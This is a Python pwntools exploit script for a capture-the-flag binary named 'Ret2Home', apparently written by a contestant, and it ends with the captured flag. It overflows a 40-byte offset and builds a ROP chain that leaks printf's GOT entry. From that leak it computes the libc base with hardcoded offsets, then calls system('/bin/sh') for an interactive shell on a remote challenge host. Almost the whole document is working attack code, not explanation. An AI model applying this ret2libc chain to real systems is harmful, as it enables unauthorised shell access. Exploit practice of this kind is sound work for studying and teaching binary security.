#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './Ret2Home'
elf = context.binary = ELF(exe, checksec=True)
rop = ROP(exe)
context.log_level = 'debug'
host = '20.205.238.7'
port = 10055

def start(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = start()

# Got manually through cyclic gdb-pwndbg
offset = 40

# flattening  payload here
payload = flat({
    offset: [
        rop.rdi.address,
        elf.got['printf'],
        rop.ret.address,
        elf.plt['printf'],
        rop.ret.address,
        elf.sym['main']   
    ]
})

# sending payload
io.sendlineafter(b'Input me:', payload)

# libc.blukat.me found libc6_2.31-0ubuntu9.9_amd64 
printf = unpack(io.recvuntil(b'Input')[:-5].strip().ljust(8, b'\x00')) 
libcbase = printf - 0x061c90
binsh = libcbase + 0x1b45bd
system = libcbase + 0x052290

info('printf: %#x', printf)
info('libcbase: %#x', libcbase)
info('binsh: %#x', binsh)
info('system: %#x', system)

payload = flat({
    offset: [
        rop.rdi.address,
        binsh,
        rop.ret.address,
        system
    ]
})

io.sendlineafter(b'me:', payload)

io.interactive()
# KWCTF{R3t2_L1bc_I5_N0t_Diff1cult_Right??}
